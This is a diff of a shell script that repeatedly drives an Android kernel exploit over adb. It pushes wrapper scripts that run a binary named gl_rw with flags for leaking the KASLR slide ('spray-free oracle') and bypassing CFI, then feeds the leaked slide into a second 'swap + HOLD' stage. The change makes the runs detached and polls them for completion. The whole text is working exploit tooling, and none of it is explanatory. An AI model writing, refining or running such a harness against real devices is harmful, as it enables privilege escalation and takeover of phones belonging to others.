@@ -25,9 +25,15 @@ for cycle in $(seq 1 $MAX); do
   [ "$UP0" -lt 130 ] && { echo "uptime ${UP0}s < 130 — waiting for boot to settle"; sleep $((130-UP0+10)); }
 
   # ---- O-fire: spray-free oracle (blocking; process exits) ----
-  printf '#!/system/bin/sh\nexport MODE4_ONLY=1\nexport MODE4_SLIDE=1\nexport MODE4_SWAP_NOCFI=1\ncd /data/local/tmp\nexec /data/local/tmp/gl_rw\n' > /tmp/gl_o.sh
-  adb push /tmp/gl_o.sh /data/local/tmp/glr.sh >/dev/null 2>&1
-  adb shell "tr -d '\\r' < /data/local/tmp/glr.sh > /data/local/tmp/glrr.sh; chmod 755 /data/local/tmp/glrr.sh; /data/local/tmp/glrr.sh" >/dev/null 2>&1
+  printf '#!/system/bin/sh\nexport MODE4_ONLY=1\nexport MODE4_SLIDE=1\nexport MODE4_SWAP_NOCFI=1\ncd /data/local/tmp\n/data/local/tmp/gl_rw; echo EXIT=$?\n' > "$ROOT"/tmp_o.sh
+  adb push "$ROOT"/tmp_o.sh /data/local/tmp/glr_raw.sh >/dev/null 2>&1
+  adb shell "tr -d '\\r' < /data/local/tmp/glr_raw.sh > /data/local/tmp/glrr.sh && chmod 755 /data/local/tmp/glrr.sh" >/dev/null 2>&1
+  adb shell "rm -f /data/local/tmp/gl_out.txt; nohup /data/local/tmp/glrr.sh > /data/local/tmp/gl_out.txt 2>&1 & sleep 1" >/dev/null 2>&1
+  for i in $(seq 1 100); do
+    E=$(adb shell "grep -c 'EXIT=' /data/local/tmp/gl_out.txt 2>/dev/null" | tr -d '\r')
+    [ "$E" -ge 1 ] 2>/dev/null && break
+    sleep 3
+  done
   BID=$(adb shell "cat /proc/sys/kernel/random/boot_id" | tr -d '\r')
   UP1=$(uptime)
   echo "O-fire: boot_id=$BID uptime=$UP1"
@@ -37,8 +43,8 @@ for cycle in $(seq 1 $MAX); do
   echo "SLIDE=$SLIDE (redirect live)"
 
   # ---- N-fire: swap + HOLD, detached ----
-  printf '#!/system/bin/sh\nexport MODE4_ONLY=1\nexport MODE4_SLIDE_SWAP=1\nexport KASLR_SLIDE=%s\nexport MODE4_SWAP_NOCFI=1\nexport MODE4_SWAP_HOLD=1\ncd /data/local/tmp\nexec /data/local/tmp/gl_rw\n' "$SLIDE" > /tmp/gl_n.sh
-  adb push /tmp/gl_n.sh /data/local/tmp/glr_raw.sh >/dev/null 2>&1
+  printf '#!/system/bin/sh\nexport MODE4_ONLY=1\nexport MODE4_SLIDE_SWAP=1\nexport KASLR_SLIDE=%s\nexport MODE4_SWAP_NOCFI=1\nexport MODE4_SWAP_HOLD=1\ncd /data/local/tmp\n/data/local/tmp/gl_rw; echo EXIT=$?\n' "$SLIDE" > "$ROOT"/tmp_n.sh
+  adb push "$ROOT"/tmp_n.sh /data/local/tmp/glr_raw.sh >/dev/null 2>&1
   adb shell "tr -d '\\r' < /data/local/tmp/glr_raw.sh > /data/local/tmp/glrr.sh && chmod 755 /data/local/tmp/glrr.sh && rm -f /data/local/tmp/gl_out.txt && nohup /data/local/tmp/glrr.sh > /data/local/tmp/gl_out.txt 2>&1 &" >/dev/null 2>&1
   sleep 2
   LS=$(adb shell "ls /data/local/tmp/glrr.sh 2>&1" | tr -d '\r')
